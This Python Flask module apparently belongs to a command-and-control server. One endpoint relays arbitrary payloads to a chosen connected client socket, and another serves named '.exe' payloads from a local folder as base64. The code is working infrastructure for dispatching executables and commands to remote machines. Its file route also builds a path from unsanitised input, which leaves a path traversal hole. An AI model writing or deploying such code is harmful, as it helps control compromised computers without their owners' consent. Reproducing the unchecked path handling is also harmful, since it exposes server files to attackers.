import base64
import flask
import threading
import common
import json
import os


api_routes = flask.Blueprint('api', __name__)


@api_routes.route('/api/payload/exec', methods=['POST'])
def exec_payload():
	data = json.loads(flask.request.data.decode())
	client = data["client"]
	payload = data["payload"]

	if client and payload:
		client_sock = [host for host in common.hosts if host[0][0] == client][0][1]
		if client_sock:
			common.send_msg(client_sock, payload.encode())
			return "Sent", 200
		else:
			return "Error", 500
	else:
		return "Missing params", 400


@api_routes.route('/api/payload/get', methods=['POST'])
def get_payload():
	data = json.loads(flask.request.data.decode())
	name = data["name"]

	if name:
		f = open(os.path.dirname(__file__) + "/../payloads/%s.exe" % name, "rb")
		payload_bytes = f.read()
		f.close()

		if payload_bytes:
			return base64.b64encode(payload_bytes), 200
		else:
			return "Error", 500
	else:
		return "Missing params", 400